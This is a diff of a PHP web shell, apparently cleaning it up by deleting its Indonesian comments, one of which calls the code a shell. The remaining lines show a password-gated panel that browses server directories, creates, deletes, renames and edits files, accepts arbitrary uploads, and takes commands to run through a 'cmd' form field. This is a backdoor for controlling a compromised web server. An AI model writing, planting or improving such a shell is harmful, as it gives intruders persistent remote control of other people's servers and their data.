@@ -14,7 +14,6 @@ if (isset($_GET['logout'])) {
     exit;
 }
 
-// Form Login Sederhana
 if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     if (isset($_POST['pass'])) {
         if (md5($_POST['pass']) === $password_md5) {
@@ -49,18 +48,15 @@ if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
     exit;
 }
 
-// --- LANJUTAN KODE LOGIKA SHELL LO (DELETE, RENAME, DLL) ---
 $path = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
 $path = str_replace('\\', '/', realpath($path));
 if (file_exists($path)) { chdir($path); }
 
-// Fungsi pembantu untuk membaca angka chmod (misal: 0755)
 function dapatkan_chmod($file_path) {
     if (!file_exists($file_path)) return "-";
     return substr(sprintf('%o', fileperms($file_path)), -4);
 }
 
-// LOGIKA CREATE FILE
 if (isset($_POST['new_file'])) {
     $name = $_POST['filename'];
     if (!empty($name)) {
@@ -70,7 +66,6 @@ if (isset($_POST['new_file'])) {
     exit;
 }
 
-// LOGIKA CREATE FOLDER
 if (isset($_POST['new_folder'])) {
     $name = $_POST['foldername'];
     if (!empty($name) && !file_exists($path . '/' . $name)) {
@@ -80,7 +75,6 @@ if (isset($_POST['new_folder'])) {
     exit;
 }
 
-// LOGIKA DELETE
 if (isset($_GET['del'])) {
     $target = $path . '/' . $_GET['del'];
     if (file_exists($target)) {
@@ -90,7 +84,6 @@ if (isset($_GET['del'])) {
     exit;
 }
 
-// LOGIKA RENAME
 if (isset($_POST['rename_obj'])) {
     $old = $path . '/' . $_POST['old_name'];
     $new = $path . '/' . $_POST['new_name'];
@@ -101,21 +94,18 @@ if (isset($_POST['rename_obj'])) {
     exit;
 }
 
-// LOGIKA EDIT (SAVE)
 if (isset($_POST['save_file'])) {
     file_put_contents($path . '/' . $_POST['fname'], $_POST['file_content']);
     header("Location: ?dir=" . urlencode($path));
     exit;
 }
 
-// LOGIKA UPLOAD
 if (isset($_FILES['up_file'])) {
     move_uploaded_file($_FILES['up_file']['tmp_name'], $path . '/' . $_FILES['up_file']['name']);
     header("Location: ?dir=" . urlencode($path));
     exit;
 }
 
-// LOGIKA CMD
 $cmd_result = "";
 if (isset($_POST['exec_cmd']) && !empty($_POST['cmd'])) {
     $command = $_POST['cmd'];
@@ -219,8 +209,6 @@ if (isset($_POST['exec_cmd']) && !empty($_POST['cmd'])) {
             $full = $path . '/' . $item;
             $is_dir = is_dir($full);
             $size = $is_dir ? "-" : round(filesize($full)/1024, 2)." KB";
-            
-            // Mengambil status permission octal file/folder saat looping berjalan
             $perms = dapatkan_chmod($full);
             
             echo "<tr>
